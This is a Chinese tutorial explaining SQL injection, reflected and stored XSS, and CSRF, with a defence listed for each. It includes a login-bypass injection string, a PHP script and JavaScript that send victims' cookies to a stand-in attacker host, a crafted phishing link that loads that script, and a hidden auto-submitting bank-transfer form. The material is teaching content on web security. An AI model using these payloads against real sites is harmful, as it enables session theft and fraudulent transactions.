# 常见web漏洞（Sql注入、XSS、CSRF）原理以及攻防总结
## Sql注入
所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 攻击者通过在应用程序预先定义好的SQL语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的查询,篡改命令。<br/>
**攻击原理**
``` python
假设的登录查询
SELECT * FROM  users  WHERE login = 'victor' AND password = '123
Sever端代码
String sql = "SELECT * FROM users WHERE login = '" + formusr + "' AND password = '" + formpwd + "'";
输入字符
formusr = ' or 1=1
formpwd = anything
实际的查询代码
SELECT * FROM users WHERE username = ' ' or 1=1  AND password = 'anything' 
```
**如何防范**<br/>
 - 服务端特殊字符过滤: <、>、* 、& 等
 - 使用ORM框架
 - 参数化Sql查询语句
## Xss攻击
 XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。<br/>
 **分类： 反射型和持久型**<br/>
### 反射型
这种攻击不经过数据库，是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的，攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。<br/>
**这种漏洞主要存在于与用户有交互的地方，如搜索框，如果后台没有对搜索的内容进行过滤，而原封不动的将搜索内容展示在dom中，则存在Xss漏洞**<br/>
**详细攻击方式如下：**
 - 构建自己的黑客网站 如： hacker.qq.com
 - 该域名下有一 hack.php:
 ``` php
<?php 
$cookie = $_GET['q']; 
var_dump($cookie); 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie); 
?>
```
- 另外一 hack.js
``` js
var img = new Image();
img.src = "http://hacker.qq.com/hack.php?q="+document.cookie;
document.body.append(img);
```
- 构造一个连接来欺骗用户
``` html
<a href="http://xsstest.qq.com/search.php?q=%3Cscript+
src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E&commend=
all&ssid=s5-e&search_type=item&atype=&filterFineness=&rr=
1&pcat=food2011&style=grid&cat=">点击就送998</a>
```
假设``` http://xsstest.qq.com ```就是存在xss漏洞的网站，search.php后的q参数 ,解码后为<br/>
``` <script src="http://hacker.qq.com/hacker.js"></script>``` <br/>
实际的作用是模拟用户在搜索框中输入<br/>
``` <script src="http://hacker.qq.com/hacker.js"></script> ```<br/>
后点击搜索。search.php未经处理的将其直接输入到页面， 黑客就可以获取用户在xsstest.qq.com网站的cookie。<br/>
**如何防范** <br/>
- 后台对敏感字符过滤
- 前端encodehtml
### 持久型
他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。<br/>
如上例中的hack.js, 如果用户输入的内容是hack.js中的内容，而网站没有对用户输入的内容进行审查就存入数据库，然后在论坛帖子中展示，其他用户在浏览论坛的时候就会在浏览器中执行hack.js的js脚本。<br/>
**如何防范** <br/>
- 后台对敏感字符过滤
## CSRF
CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br/>
你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。<br/>
**原理** <br/>
*网站A ：为恶意网站。<br/>
网站B ：用户已登录的网站。<br/>
当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。<br/>
假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&id=81723 <br/>
A站 直接访问该链接，就能删除用户在 B站 的评论。<br/>*
**CSRF 与 Xss 最大的区别是： CSRF不直接获取用户的cookie, 而Xss 则会直接获取用户的Cookie** <br/>
**如果用户访问了某一个银行的网站忘记登出了， 然后又访问了一个恶意网站，而恶意网站中存在以下代码，则发生CSRF** <br/>
``` html
<html>
<head>
  <script type="text/javascript">
    function steal()
    {
             iframe = document.frames["steal"];
             iframe.document.Submit("transfer");
    }
  </script>
</head>
<body onload="steal()">
 <iframe name="steal" display="none">
   <form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
     <input type="hidden" name="toBankId" value="11">
     <input type="hidden" name="money" value="1000">
   </form>
 </iframe>
</body>
</html>
```
**如何防范**
- 验证码
- Cookie Hashing(所有表单请求都包含同一个伪随机值)，**原则上来讲黑客无法获取用户的cookie，只是原则上来讲**
``` html
<?php
   $hash = md5($_COOKIE['cookie']);
 ?>
 <form method=”POST” action=”transfer.php”>
   <input type=”text” name=”toBankId”>
   <input type=”text” name=”money”>
   <input type=”hidden” name=”hash” value=”<?=$hash;?>”>
   <input type=”submit” name=”submit” value=”Submit”>
 </form>
```
然后在服务器端进行Hash值验证。
